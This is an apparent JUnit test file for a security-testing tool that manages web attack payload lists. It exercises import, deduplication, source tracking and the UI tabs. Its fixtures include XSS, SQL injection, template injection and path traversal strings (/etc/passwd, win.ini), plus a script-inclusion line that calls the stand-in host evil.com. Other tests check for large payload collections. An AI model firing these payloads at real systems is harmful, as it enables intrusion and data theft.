// Created with the help of an AI Agent and littlespidy.
package com.littlespidy.payloadinjector.model;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Created with the help of an AI Agent and littlespidy.
 *
 * Automated test suite verifying payload import, clipboard export,
 * deduplication with safe file backups, source metadata tracking, and edge cases.
 *
 * @author littlespidy
 */
public class PayloadFeaturesTest_littlespidy {

    @TempDir
    Path tempDir;

    private List<ParamPayloadEntry> sampleEntries;

    @BeforeEach
    void setUp() {
        sampleEntries = new ArrayList<>();
        sampleEntries.add(new ParamPayloadEntry("id-1", "Payload One", "<script>alert(1)</script>", "Basic alert", true, "Manual", "N/A"));
        sampleEntries.add(new ParamPayloadEntry("id-2", "Payload Two", "' OR 1=1--", "Auth bypass", true, "Manual", "N/A"));
        sampleEntries.add(new ParamPayloadEntry("id-3", "Payload Three", "{{7*7}}", "Jinja expression", true, "Imported", "test_payloads.txt"));
    }

    // ── Import Feature Tests ──

    @Test
    void testImportValidTxtFile() throws IOException {
        Path txtFile = tempDir.resolve("valid_payloads.txt");
        String content = "<script>alert(1)</script>\n' OR '1'='1\n{{7*7}}\n<img src=x onerror=alert(2)>";
        Files.writeString(txtFile, content, StandardCharsets.UTF_8);

        List<ParamPayloadEntry> imported = PayloadFileService_littlespidy.importPayloadsFromTxt(txtFile.toFile());

        assertEquals(4, imported.size());
        assertEquals("<script>alert(1)</script>", imported.get(0).getTemplate());
        assertEquals("' OR '1'='1", imported.get(1).getTemplate());
        assertEquals("{{7*7}}", imported.get(2).getTemplate());
        assertEquals("<img src=x onerror=alert(2)>", imported.get(3).getTemplate());

        for (ParamPayloadEntry entry : imported) {
            assertEquals("Imported", entry.getSourceType());
            assertEquals("valid_payloads.txt", entry.getSourceFile());
            assertEquals("", entry.getDescription(), "Imported payloads should have empty description");
            assertTrue(entry.isEnabled());
            assertNotNull(entry.getId());
            assertFalse(entry.getName().isEmpty());
        }
    }

    @Test
    void testImportPreservesMeaningfulWhitespaceAndSpecialCharacters() throws IOException {
        Path txtFile = tempDir.resolve("special_payloads.txt");
        // Note leading and trailing spaces, tabs, and special characters
        String payload1 = "   ' UNION SELECT 1, 2, '   special   '--   ";
        String payload2 = "\t<svg onload=\"alert('&quot;')\">\t";
        String payload3 = "\"><script src=\"//evil.com/x?a=1&b=2\"></script>";

        String fileContent = payload1 + "\n\n" + payload2 + "\n   \n" + payload3 + "\n";
        Files.writeString(txtFile, fileContent, StandardCharsets.UTF_8);

        List<ParamPayloadEntry> imported = PayloadFileService_littlespidy.importPayloadsFromTxt(txtFile.toFile());

        assertEquals(3, imported.size(), "Blank and whitespace-only lines should be ignored");
        assertEquals(payload1, imported.get(0).getTemplate(), "Meaningful whitespace must be preserved");
        assertEquals(payload2, imported.get(1).getTemplate(), "Tab characters must be preserved");
        assertEquals(payload3, imported.get(2).getTemplate(), "Special characters and quotes must be preserved");
    }

    @Test
    void testImportRejectsNonTxtFile() throws IOException {
        Path jsonFile = tempDir.resolve("payloads.json");
        Files.writeString(jsonFile, "[\"payload\"]", StandardCharsets.UTF_8);

        IllegalArgumentException ex = assertThrows(IllegalArgumentException.class, () ->
                PayloadFileService_littlespidy.importPayloadsFromTxt(jsonFile.toFile()));

        assertTrue(ex.getMessage().contains("Only .txt files are supported"));
    }

    @Test
    void testImportRejectsEmptyFile() throws IOException {
        Path emptyFile = tempDir.resolve("empty.txt");
        Files.writeString(emptyFile, "", StandardCharsets.UTF_8);

        IllegalArgumentException ex = assertThrows(IllegalArgumentException.class, () ->
                PayloadFileService_littlespidy.importPayloadsFromTxt(emptyFile.toFile()));

        assertTrue(ex.getMessage().contains("file is empty"));
    }

    @Test
    void testImportRejectsFileWithOnlyBlankLines() throws IOException {
        Path blankFile = tempDir.resolve("only_blanks.txt");
        Files.writeString(blankFile, "   \n\n\t\t\n   \n", StandardCharsets.UTF_8);

        IllegalArgumentException ex = assertThrows(IllegalArgumentException.class, () ->
                PayloadFileService_littlespidy.importPayloadsFromTxt(blankFile.toFile()));

        assertTrue(ex.getMessage().contains("No valid non-empty payloads found"));
    }

    @Test
    void testImportRejectsNonExistentFile() {
        File missing = tempDir.resolve("does_not_exist.txt").toFile();
        assertThrows(IllegalArgumentException.class, () ->
                PayloadFileService_littlespidy.importPayloadsFromTxt(missing));
    }

    @Test
    void testImportRejectsNullFile() {
        assertThrows(IllegalArgumentException.class, () ->
                PayloadFileService_littlespidy.importPayloadsFromTxt(null));
    }

    // ── Copy All Feature Tests ──

    @Test
    void testCopyPayloadsToClipboardEmptyList() {
        int count = PayloadFileService_littlespidy.copyPayloadsToClipboard(new ArrayList<>());
        assertEquals(0, count);

        count = PayloadFileService_littlespidy.copyPayloadsToClipboard(null);
        assertEquals(0, count);
    }

    @Test
    void testCopyPayloadsContentFormatting() {
        List<ParamPayloadEntry> entries = new ArrayList<>();
        entries.add(new ParamPayloadEntry("1", "Name 1", "Payload <1>", "Desc 1", true, "Manual", "N/A"));
        entries.add(new ParamPayloadEntry("2", "Name 2", "Payload <2>", "Desc 2", true, "Imported", "f.txt"));
        entries.add(new ParamPayloadEntry("3", "Name 3", "Payload <3>", "", true, "Manual", "N/A"));

        // Test without headless exception or verify clipboard payload builder
        try {
            int copied = PayloadFileService_littlespidy.copyPayloadsToClipboard(entries);
            assertEquals(3, copied);
        } catch (java.awt.HeadlessException ignored) {
            // Environment running in headless CI/container without X11 clipboard
        }
    }

    // ── Deduplication Feature Tests ──

    @Test
    void testDeduplicateRetainsEntryWithDescriptionWhenDuplicateLacksDescription() throws IOException {
        List<ParamPayloadEntry> list = new ArrayList<>();
        // Duplicate 1: has no description, appears first
        list.add(new ParamPayloadEntry("1", "Imported 1", "<script>alert(1)</script>", "", true, "Imported", "file1.txt"));
        // Duplicate 2: has description, appears second
        list.add(new ParamPayloadEntry("2", "Manual Script", "<script>alert(1)</script>", "Classic XSS", true, "Manual", "N/A"));
        // Different payload
        list.add(new ParamPayloadEntry("3", "SQL injection", "' OR 1=1--", "SQLi", true, "Manual", "N/A"));

        PayloadFileService_littlespidy.DeduplicationResult_littlespidy result =
                PayloadFileService_littlespidy.deduplicate(list, tempDir, "XSS");

        assertEquals(1, result.removedCount());
        assertEquals(2, result.remainingCount());

        List<ParamPayloadEntry> remaining = result.deduplicatedList();
        assertEquals(2, remaining.size());

        ParamPayloadEntry keptXss = remaining.get(0);
        assertEquals("<script>alert(1)</script>", keptXss.getTemplate());
        assertEquals("Classic XSS", keptXss.getDescription(), "Must retain the entry with description");
        assertEquals("Manual Script", keptXss.getName());
        assertEquals("Imported, Manual", keptXss.getSourceType(), "Must combine source types across duplicates");
        assertEquals("file1.txt", keptXss.getSourceFile(), "Must retain source file from group");

        List<ParamPayloadEntry> removed = result.removedDuplicates();
        assertEquals(1, removed.size());
        assertEquals("", removed.get(0).getDescription());
        assertEquals("file1.txt", removed.get(0).getSourceFile());
    }

    @Test
    void testDeduplicatePreservesFirstEntryWhenMultipleHaveDescriptions() throws IOException {
        List<ParamPayloadEntry> list = new ArrayList<>();
        list.add(new ParamPayloadEntry("1", "First Entry", "<svg/onload=alert(1)>", "First Description", true, "Manual", "N/A"));
        list.add(new ParamPayloadEntry("2", "Second Entry", "<svg/onload=alert(1)>", "Second Description", true, "Imported", "test.txt"));

        PayloadFileService_littlespidy.DeduplicationResult_littlespidy result =
                PayloadFileService_littlespidy.deduplicate(list, tempDir, "XSS");

        assertEquals(1, result.removedCount());
        assertEquals(1, result.remainingCount());

        ParamPayloadEntry kept = result.deduplicatedList().get(0);
        assertEquals("First Entry", kept.getName());
        assertEquals("First Description", kept.getDescription());
        assertEquals("Manual, Imported", kept.getSourceType(), "Must combine source types across duplicates");
        assertEquals("test.txt", kept.getSourceFile(), "Must retain source file from duplicate");
    }

    @Test
    void testDeduplicatePreservesOriginalOrderOfUniqueEntries() throws IOException {
        List<ParamPayloadEntry> list = new ArrayList<>();
        list.add(new ParamPayloadEntry("1", "A", "PAYLOAD_A", "Desc A", true));
        list.add(new ParamPayloadEntry("2", "B", "PAYLOAD_B", "Desc B", true));
        list.add(new ParamPayloadEntry("3", "A_dup", "PAYLOAD_A", "", true));
        list.add(new ParamPayloadEntry("4", "C", "PAYLOAD_C", "Desc C", true));
        list.add(new ParamPayloadEntry("5", "B_dup", "PAYLOAD_B", "", true));

        PayloadFileService_littlespidy.DeduplicationResult_littlespidy result =
                PayloadFileService_littlespidy.deduplicate(list, tempDir, "Test");

        assertEquals(2, result.removedCount());
        assertEquals(3, result.remainingCount());

        List<ParamPayloadEntry> remaining = result.deduplicatedList();
        assertEquals("PAYLOAD_A", remaining.get(0).getTemplate());
        assertEquals("PAYLOAD_B", remaining.get(1).getTemplate());
        assertEquals("PAYLOAD_C", remaining.get(2).getTemplate());
    }

    @Test
    void testDeduplicateCreatesBackupFilesSafely() throws IOException {
        List<ParamPayloadEntry> list = new ArrayList<>();
        list.add(new ParamPayloadEntry("1", "Orig", "PAYLOAD_X", "Desc", true, "Manual", "N/A"));
        list.add(new ParamPayloadEntry("2", "Dup", "PAYLOAD_X", "", true, "Imported", "list.txt"));

        PayloadFileService_littlespidy.DeduplicationResult_littlespidy result =
                PayloadFileService_littlespidy.deduplicate(list, tempDir, "SQL");

        assertNotNull(result.removedFilePath());
        assertNotNull(result.deduplicatedFilePath());

        assertTrue(Files.exists(result.removedFilePath()), "Removed duplicates backup file must exist");
        assertTrue(Files.exists(result.deduplicatedFilePath()), "Deduplicated list backup file must exist");

        assertTrue(Files.size(result.removedFilePath()) > 0, "Removed duplicates backup file must not be empty");
        assertTrue(Files.size(result.deduplicatedFilePath()) > 0, "Deduplicated list backup file must not be empty");

        String removedContent = Files.readString(result.removedFilePath(), StandardCharsets.UTF_8);
        assertTrue(removedContent.contains("PAYLOAD_X"));
        assertTrue(removedContent.contains("list.txt"));
        assertTrue(removedContent.contains("Imported"));

        String dedupContent = Files.readString(result.deduplicatedFilePath(), StandardCharsets.UTF_8);
        assertTrue(dedupContent.contains("PAYLOAD_X"));
        assertTrue(dedupContent.contains("Desc"));
        assertTrue(dedupContent.contains("Manual"));
    }

    @Test
    void testDeduplicateZeroDuplicatesDoesNotCreateFiles() throws IOException {
        List<ParamPayloadEntry> list = new ArrayList<>();
        list.add(new ParamPayloadEntry("1", "A", "PAYLOAD_1", "Desc 1", true));
        list.add(new ParamPayloadEntry("2", "B", "PAYLOAD_2", "Desc 2", true));

        PayloadFileService_littlespidy.DeduplicationResult_littlespidy result =
                PayloadFileService_littlespidy.deduplicate(list, tempDir, "SQL");

        assertEquals(0, result.removedCount());
        assertEquals(2, result.remainingCount());
        assertNull(result.removedFilePath());
        assertNull(result.deduplicatedFilePath());
    }

    // ── Metadata and Model Tests ──

    @Test
    void testSourceMetadataDefaultsAndSetters() {
        ParamPayloadEntry entry = new ParamPayloadEntry("id", "name", "template", "desc", true);
        assertEquals("Manual", entry.getSourceType());
        assertEquals("N/A", entry.getSourceFile());

        entry.setSourceType("Imported");
        entry.setSourceFile("custom.txt");
        assertEquals("Imported", entry.getSourceType());
        assertEquals("custom.txt", entry.getSourceFile());

        // Test blank protection
        entry.setSourceType("   ");
        assertEquals("Manual", entry.getSourceType());

        entry.setSourceFile(null);
        assertEquals("N/A", entry.getSourceFile());
    }

    @Test
    void testJsonMigrationDefaultsForMissingSourceFields() {
        // Simulates existing JSON file that has no sourceType or sourceFile fields
        String oldJson = """
                [
                  {
                    "id": "legacy-1",
                    "name": "Legacy Payload",
                    "template": "<script>alert(1)</script>",
                    "description": "Legacy desc",
                    "enabled": true
                  }
                ]
                """;

        com.google.gson.Gson gson = new com.google.gson.Gson();
        java.lang.reflect.Type listType = new com.google.gson.reflect.TypeToken<List<java.util.Map<String, Object>>>() {}.getType();
        List<java.util.Map<String, Object>> rawList = gson.fromJson(oldJson, listType);

        assertNotNull(rawList);
        assertEquals(1, rawList.size());
        java.util.Map<String, Object> map = rawList.get(0);
        assertNull(map.get("sourceType"));
        assertNull(map.get("sourceFile"));

        // When converted to ParamPayloadEntry with migration defaults
        String srcType = (map.get("sourceType") != null) ? (String) map.get("sourceType") : "Manual";
        String srcFile = (map.get("sourceFile") != null) ? (String) map.get("sourceFile") : "N/A";
        ParamPayloadEntry migrated = new ParamPayloadEntry(
                (String) map.get("id"),
                (String) map.get("name"),
                (String) map.get("template"),
                (String) map.get("description"),
                Boolean.TRUE.equals(map.get("enabled")),
                srcType,
                srcFile
        );

        assertEquals("Manual", migrated.getSourceType());
        assertEquals("N/A", migrated.getSourceFile());
        assertEquals("Legacy Payload", migrated.getName());
    }

    @Test
    void testTableSorterToggleAlternatesAscendingAndDescending() {
        javax.swing.table.DefaultTableModel model = new javax.swing.table.DefaultTableModel(
                new Object[][]{
                        {"Beta", "2"},
                        {"Alpha", "1"},
                        {"Gamma", "3"}
                },
                new String[]{"Name", "Value"}
        );

        javax.swing.table.TableRowSorter<javax.swing.table.DefaultTableModel> sorter =
                new javax.swing.table.TableRowSorter<>(model) {
                    @Override
                    public void toggleSortOrder(int column) {
                        List<? extends javax.swing.RowSorter.SortKey> sortKeys = getSortKeys();
                        if (!sortKeys.isEmpty() && sortKeys.get(0).getColumn() == column) {
                            if (sortKeys.get(0).getSortOrder() == javax.swing.SortOrder.ASCENDING) {
                                setSortKeys(List.of(new javax.swing.RowSorter.SortKey(column, javax.swing.SortOrder.DESCENDING)));
                                return;
                            } else {
                                setSortKeys(List.of(new javax.swing.RowSorter.SortKey(column, javax.swing.SortOrder.ASCENDING)));
                                return;
                            }
                        }
                        setSortKeys(List.of(new javax.swing.RowSorter.SortKey(column, javax.swing.SortOrder.ASCENDING)));
                    }
                };

        // First click on column 0: ASCENDING
        sorter.toggleSortOrder(0);
        assertEquals(javax.swing.SortOrder.ASCENDING, sorter.getSortKeys().get(0).getSortOrder());
        assertEquals("Alpha", model.getValueAt(sorter.convertRowIndexToModel(0), 0));
        assertEquals("Beta", model.getValueAt(sorter.convertRowIndexToModel(1), 0));
        assertEquals("Gamma", model.getValueAt(sorter.convertRowIndexToModel(2), 0));

        // Second click on column 0: DESCENDING
        sorter.toggleSortOrder(0);
        assertEquals(javax.swing.SortOrder.DESCENDING, sorter.getSortKeys().get(0).getSortOrder());
        assertEquals("Gamma", model.getValueAt(sorter.convertRowIndexToModel(0), 0));
        assertEquals("Beta", model.getValueAt(sorter.convertRowIndexToModel(1), 0));
        assertEquals("Alpha", model.getValueAt(sorter.convertRowIndexToModel(2), 0));

        // Third click on column 0: toggles back to ASCENDING (Burp-style two-state toggle)
        sorter.toggleSortOrder(0);
        assertEquals(javax.swing.SortOrder.ASCENDING, sorter.getSortKeys().get(0).getSortOrder());
        assertEquals("Alpha", model.getValueAt(sorter.convertRowIndexToModel(0), 0));
    }

    // ── OWASP Payload Integration Tests ──

    @Test
    void testOwaspPayloadsInStandardJsonFiles() throws IOException {
        com.google.gson.Gson gson = new com.google.gson.Gson();
        java.lang.reflect.Type listType = new com.google.gson.reflect.TypeToken<List<java.util.Map<String, Object>>>() {}.getType();

        // 1. Verify XSS payloads
        Path xssPath = Path.of("xss_payloads.json");
        assertTrue(Files.exists(xssPath), "xss_payloads.json must exist");
        List<java.util.Map<String, Object>> xssList = gson.fromJson(Files.readString(xssPath), listType);
        assertTrue(xssList.size() >= 500, "XSS payloads list should contain >= 500 entries after OWASP import");
        long owaspXssCount = xssList.stream().filter(e -> {
            String src = (String) e.get("sourceType");
            return src != null && src.contains("OWASP");
        }).count();
        assertTrue(owaspXssCount > 500, "Should have > 500 OWASP XSS payloads");

        // 2. Verify SQL payloads
        Path sqlPath = Path.of("sql_payloads.json");
        assertTrue(Files.exists(sqlPath), "sql_payloads.json must exist");
        List<java.util.Map<String, Object>> sqlList = gson.fromJson(Files.readString(sqlPath), listType);
        assertTrue(sqlList.size() >= 150, "SQL payloads list should contain >= 150 entries after OWASP import");
        long owaspSqlCount = sqlList.stream().filter(e -> {
            String src = (String) e.get("sourceType");
            return src != null && src.contains("OWASP");
        }).count();
        assertTrue(owaspSqlCount > 100, "Should have > 100 OWASP SQL payloads");

        // 3. Verify CSTI payloads
        Path cstiPath = Path.of("csti_payloads.json");
        assertTrue(Files.exists(cstiPath), "csti_payloads.json must exist");
        List<java.util.Map<String, Object>> cstiList = gson.fromJson(Files.readString(cstiPath), listType);
        assertTrue(cstiList.size() >= 100, "CSTI payloads list should contain >= 100 entries after OWASP import");

        // 4. Verify HTTP Request Smuggling payloads
        Path smugPath = Path.of("http_request_smuggling_payloads.json");
        assertTrue(Files.exists(smugPath), "http_request_smuggling_payloads.json must exist");
        List<java.util.Map<String, Object>> smugList = gson.fromJson(Files.readString(smugPath), listType);
        assertTrue(smugList.size() >= 30, "Smuggling payloads list should contain >= 30 entries after OWASP import");

        // Verify description is non-empty for all entries
        for (var entry : xssList) {
            String desc = (String) entry.get("description");
            assertNotNull(desc);
            assertFalse(desc.isBlank(), "Payload description must not be blank: " + entry.get("name"));
        }
    }

    @Test
    void testGeneratedCategoryJsonFiles() throws IOException {
        com.google.gson.Gson gson = new com.google.gson.Gson();
        java.lang.reflect.Type listType = new com.google.gson.reflect.TypeToken<List<java.util.Map<String, Object>>>() {}.getType();

        Path cmdInjectionPath = Path.of("command_injection_payloads_littlespidy.json");
        assertTrue(Files.exists(cmdInjectionPath), "command_injection_payloads_littlespidy.json must exist");
        List<java.util.Map<String, Object>> cmdList = gson.fromJson(Files.readString(cmdInjectionPath), listType);
        assertFalse(cmdList.isEmpty(), "Command injection payloads should not be empty");

        Path ssrfPath = Path.of("ssrf_payloads_littlespidy.json");
        assertTrue(Files.exists(ssrfPath), "ssrf_payloads_littlespidy.json must exist");
        List<java.util.Map<String, Object>> ssrfList = gson.fromJson(Files.readString(ssrfPath), listType);
        assertFalse(ssrfList.isEmpty(), "SSRF payloads should not be empty");

        Path traversalPath = Path.of("path_traversal_payloads_littlespidy.json");
        assertTrue(Files.exists(traversalPath), "path_traversal_payloads_littlespidy.json must exist");
        List<java.util.Map<String, Object>> traversalList = gson.fromJson(Files.readString(traversalPath), listType);
        assertFalse(traversalList.isEmpty(), "Path traversal payloads should not be empty");

        for (var entry : cmdList) {
            assertNotNull(entry.get("template"));
            assertNotNull(entry.get("description"));
            assertFalse(((String) entry.get("description")).isBlank());
        }
    }

    @Test
    void testCategoryRegistryCompleteness() {
        assertEquals(34, PayloadCategoryRegistry_littlespidy.ALL_CATEGORIES.length,
                "Registry must define all 34 parameter payload categories");

        for (var cat : PayloadCategoryRegistry_littlespidy.ALL_CATEGORIES) {
            assertNotNull(cat.displayName());
            assertFalse(cat.displayName().isBlank());
            assertNotNull(cat.jsonFileName());
            assertTrue(cat.jsonFileName().endsWith(".json"));

            Path filePath = Path.of(cat.jsonFileName());
            assertTrue(Files.exists(filePath), "JSON file must exist on disk: " + cat.jsonFileName());
            try {
                assertTrue(Files.size(filePath) > 0, "JSON file must not be empty: " + cat.jsonFileName());
            } catch (IOException e) {
                fail("Failed to read file size: " + cat.jsonFileName());
            }
        }
    }

    @Test
    void testPayloadInjectorTabStructureAndWrapLayout() {
        java.util.Map<String, ParamPayloadStore> dummyStores = new java.util.LinkedHashMap<>();
        for (var cat : PayloadCategoryRegistry_littlespidy.ALL_CATEGORIES) {
            dummyStores.put(cat.displayName(), new ParamPayloadStore(null, cat.jsonFileName()) {
                @Override
                public synchronized void reload() {
                    // No-op for unit test
                }
            });
        }
        InjectionSettings settings = new InjectionSettings();

        com.littlespidy.payloadinjector.ui.PayloadInjectorTab tab =
                new com.littlespidy.payloadinjector.ui.PayloadInjectorTab(dummyStores, null, settings);

        // Find JTabbedPane component
        javax.swing.JTabbedPane tabbedPane = null;
        for (java.awt.Component comp : tab.getComponents()) {
            if (comp instanceof javax.swing.JTabbedPane tp) {
                tabbedPane = tp;
                break;
            }
        }

        assertNotNull(tabbedPane, "Tabbed pane must be present");
        assertEquals(javax.swing.JTabbedPane.WRAP_TAB_LAYOUT, tabbedPane.getTabLayoutPolicy(),
                "Tab layout policy must be WRAP_TAB_LAYOUT (no scroll bar, append down below)");
        assertEquals(34, tabbedPane.getTabCount(), "Should have exactly 34 parameter tabs");
        assertEquals("XSS", tabbedPane.getTitleAt(0));
        assertEquals("CSTI", tabbedPane.getTitleAt(1));
        assertEquals("SQL", tabbedPane.getTitleAt(2));
    }

    @Test
    void testDualSourceTypeTrackingForDuplicatePayloads() throws IOException {
        com.google.gson.Gson gson = new com.google.gson.Gson();
        java.lang.reflect.Type listType = new com.google.gson.reflect.TypeToken<List<java.util.Map<String, Object>>>() {}.getType();

        // Verify XSS payloads that appear in both OWASP and PayloadsAllTheThings
        Path xssPath = Path.of("xss_payloads.json");
        List<java.util.Map<String, Object>> xssList = gson.fromJson(Files.readString(xssPath), listType);

        long dualSourceCount = xssList.stream().filter(e -> {
            String src = (String) e.get("sourceType");
            return src != null && src.contains("OWASP") && src.contains("PayloadsAllTheThings");
        }).count();

        assertTrue(dualSourceCount > 100, "Should have > 100 payloads reflecting both OWASP and PayloadsAllTheThings");

        // Verify newly added PayloadsAllTheThings categories
        Path crlfPath = Path.of("crlf_injection_payloads_littlespidy.json");
        assertTrue(Files.exists(crlfPath), "CRLF injection file must exist");
        Path lfiPath = Path.of("file_inclusion_payloads_littlespidy.json");
        assertTrue(Files.exists(lfiPath), "File inclusion file must exist");
        Path xxePath = Path.of("xxe_injection_payloads_littlespidy.json");
        assertTrue(Files.exists(xxePath), "XXE injection file must exist");
    }

    @Test
    void testPayloadBoxIntegrationAndMultiSourceTracking() throws IOException {
        com.google.gson.Gson gson = new com.google.gson.Gson();
        java.lang.reflect.Type listType = new com.google.gson.reflect.TypeToken<List<java.util.Map<String, Object>>>() {}.getType();

        // 1. Verify XSS payloads include PayloadBox entries and multi-source tracking
        Path xssPath = Path.of("xss_payloads.json");
        List<java.util.Map<String, Object>> xssList = gson.fromJson(Files.readString(xssPath), listType);

        long payloadBoxXssCount = xssList.stream().filter(e -> {
            String src = (String) e.get("sourceType");
            return src != null && src.contains("PayloadBox");
        }).count();
        assertTrue(payloadBoxXssCount > 500, "Should have > 500 XSS payloads from PayloadBox");

        long multiSourceXssCount = xssList.stream().filter(e -> {
            String src = (String) e.get("sourceType");
            return src != null && src.contains("PayloadBox") && (src.contains("OWASP") || src.contains("PayloadsAllTheThings"));
        }).count();
        assertTrue(multiSourceXssCount > 100, "Should have > 100 duplicate XSS payloads tracked across multiple sources");

        // Verify sourceFile has multiple files for duplicates
        long multiFileCount = xssList.stream().filter(e -> {
            String sf = (String) e.get("sourceFile");
            return sf != null && sf.contains(",");
        }).count();
        assertTrue(multiFileCount > 100, "Duplicate payloads should have combined sourceFile values");

        // 2. Verify Command Injection payloads from PayloadBox
        Path cmdPath = Path.of("command_injection_payloads_littlespidy.json");
        List<java.util.Map<String, Object>> cmdList = gson.fromJson(Files.readString(cmdPath), listType);
        long pboxCmdCount = cmdList.stream().filter(e -> {
            String src = (String) e.get("sourceType");
            return src != null && src.contains("PayloadBox");
        }).count();
        assertTrue(pboxCmdCount > 1000, "Should have > 1000 Command Injection payloads with PayloadBox source");

        // 3. Verify SQL payloads from PayloadBox
        Path sqlPath = Path.of("sql_payloads.json");
        List<java.util.Map<String, Object>> sqlList = gson.fromJson(Files.readString(sqlPath), listType);
        long pboxSqlCount = sqlList.stream().filter(e -> {
            String src = (String) e.get("sourceType");
            return src != null && src.contains("PayloadBox");
        }).count();
        assertTrue(pboxSqlCount > 200, "Should have > 200 SQL payloads with PayloadBox source");
    }

    @Test
    void testHttpRequestSmugglingSourceTypeAndSourceFileTracking() throws IOException {
        com.google.gson.Gson gson = new com.google.gson.Gson();
        java.lang.reflect.Type listType = new com.google.gson.reflect.TypeToken<List<java.util.Map<String, Object>>>() {}.getType();

        Path smugPath = Path.of("http_request_smuggling_payloads.json");
        assertTrue(Files.exists(smugPath), "http_request_smuggling_payloads.json must exist");
        List<java.util.Map<String, Object>> smugList = gson.fromJson(Files.readString(smugPath), listType);

        assertTrue(smugList.size() >= 400, "Should have >= 400 total smuggling payloads after PayloadBox import");

        long pboxSmugCount = 0;
        long multiSourceSmugCount = 0;

        for (var entry : smugList) {
            String name = (String) entry.get("name");
            String desc = (String) entry.get("description");
            String srcType = (String) entry.get("sourceType");
            String srcFile = (String) entry.get("sourceFile");

            assertNotNull(srcType, "Smuggling payload sourceType must not be null: " + name);
            assertFalse(srcType.isBlank(), "Smuggling payload sourceType must not be blank: " + name);

            assertNotNull(srcFile, "Smuggling payload sourceFile must not be null: " + name);
            assertFalse(srcFile.isBlank(), "Smuggling payload sourceFile must not be blank: " + name);

            assertNotNull(desc, "Smuggling payload description must not be null: " + name);
            assertFalse(desc.isBlank(), "Smuggling payload description must not be blank: " + name);

            if (srcType.contains("PayloadBox")) {
                pboxSmugCount++;
                if (srcType.contains("OWASP") || srcType.contains("PayloadsAllTheThings") || srcType.contains("Manual")) {
                    multiSourceSmugCount++;
                }
            }
        }

        assertTrue(pboxSmugCount > 300, "Should have > 300 smuggling payloads with PayloadBox source");
        assertTrue(multiSourceSmugCount >= 2, "Should have duplicate smuggling payloads with combined sourceType");

        // Verify Java model SmugglingPayloadEntry getters
        com.littlespidy.payloadinjector.model.SmugglingPayloadEntry testEntry =
                new com.littlespidy.payloadinjector.model.SmugglingPayloadEntry(
                        "Test Smug",
                        "Test Description",
                        java.util.Map.of("Transfer-Encoding", "chunked"),
                        "0\\r\\n\\r\\n",
                        "OWASP, PayloadBox",
                        "http-request-smuggling-payloads.txt, CL-TE-Payloads.txt"
                );

        assertEquals("OWASP, PayloadBox", testEntry.getSourceType());
        assertEquals("http-request-smuggling-payloads.txt, CL-TE-Payloads.txt", testEntry.getSourceFile());
    }

    @Test
    void testPathTraversalPayloadPlatformClassification() throws IOException {
        com.google.gson.Gson gson = new com.google.gson.Gson();
        java.lang.reflect.Type listType = new com.google.gson.reflect.TypeToken<List<java.util.Map<String, Object>>>() {}.getType();

        Path path = Path.of("path_traversal_payloads_littlespidy.json");
        assertTrue(Files.exists(path), "path_traversal_payloads_littlespidy.json must exist");

        List<java.util.Map<String, Object>> list = gson.fromJson(Files.readString(path), listType);
        assertEquals(23070, list.size(), "Should have exactly 23070 path traversal payloads");

        long windowsCount = 0;
        long linuxCount = 0;

        for (var entry : list) {
            String platform = (String) entry.get("platform");
            assertNotNull(platform, "Platform must not be null for payload: " + entry.get("name"));
            assertFalse(platform.isBlank(), "Platform must not be blank for payload: " + entry.get("name"));
            assertTrue("Windows".equals(platform) || "Linux".equals(platform),
                    "Platform must be either Windows or Linux, found: " + platform);

            if ("Windows".equals(platform)) {
                windowsCount++;
            } else if ("Linux".equals(platform)) {
                linuxCount++;
            }
        }

        assertTrue(windowsCount >= 13000, "Should have >= 13000 Windows payloads, found: " + windowsCount);
        assertTrue(linuxCount >= 9000, "Should have >= 9000 Linux payloads, found: " + linuxCount);
        assertEquals(23070, windowsCount + linuxCount, "Total Windows + Linux count must equal total payloads");
    }

    @Test
    void testPathTraversalTabSixColumns() {
        ParamPayloadStore pathStore = new ParamPayloadStore(null, "path_traversal_payloads_littlespidy.json") {
            @Override public synchronized void reload() {}
            @Override public synchronized void save() {}
        };
        pathStore.addEntry(new ParamPayloadEntry("pt-1", "Linux Traversal", "../../../etc/passwd", "Linux probe", true, "Manual", "N/A", "Linux"));
        pathStore.addEntry(new ParamPayloadEntry("pt-2", "Windows Traversal", "..\\..\\win.ini", "Windows probe", true, "Manual", "N/A", "Windows"));

        InjectionSettings settings = new InjectionSettings();
        com.littlespidy.payloadinjector.ui.ParamPayloadTab ptTab =
                new com.littlespidy.payloadinjector.ui.ParamPayloadTab("Path Traversal", pathStore, settings);

        com.littlespidy.payloadinjector.ui.ParamPayloadTab.PayloadTableModel ptModel = ptTab.getTableModel();
        assertEquals(6, ptModel.getColumnCount(), "Path Traversal tab must have exactly 6 columns");
        assertEquals("Name", ptModel.getColumnName(0));
        assertEquals("Platform", ptModel.getColumnName(1), "Second column must be Platform");
        assertEquals("Payload Value", ptModel.getColumnName(2));
        assertEquals("Description", ptModel.getColumnName(3));
        assertEquals("Source Type", ptModel.getColumnName(4));
        assertEquals("Source File", ptModel.getColumnName(5));

        assertEquals("Linux", ptModel.getValueAt(0, 1));
        assertEquals("Windows", ptModel.getValueAt(1, 1));

        // Verify standard categories retain 5 columns
        ParamPayloadStore xssStore = new ParamPayloadStore(null, "xss_payloads.json") {
            @Override public synchronized void reload() {}
            @Override public synchronized void save() {}
        };
        xssStore.addEntry(new ParamPayloadEntry("xss-1", "XSS Payload", "<script>alert(1)</script>", "XSS probe", true));
        com.littlespidy.payloadinjector.ui.ParamPayloadTab xssTab =
                new com.littlespidy.payloadinjector.ui.ParamPayloadTab("XSS", xssStore, settings);
        assertEquals(5, xssTab.getTableModel().getColumnCount(), "XSS tab must retain 5 columns");
        assertEquals("Payload Value", xssTab.getTableModel().getColumnName(1));
    }

    @Test
    void testPathTraversalContextMenuWindowsAndLinuxSubmenus() {
        ParamPayloadStore ptStore = new ParamPayloadStore(null, "path_traversal_payloads_littlespidy.json") {
            @Override public synchronized void reload() {}
            @Override public synchronized void save() {}
        };
        ptStore.addEntry(new ParamPayloadEntry("pt-1", "Linux Traversal", "../../../etc/passwd", "Linux probe", true, "Manual", "N/A", "Linux"));
        ptStore.addEntry(new ParamPayloadEntry("pt-2", "Windows Traversal", "..\\..\\win.ini", "Windows probe", true, "Manual", "N/A", "Windows"));

        java.util.Map<String, ParamPayloadStore> stores = new java.util.LinkedHashMap<>();
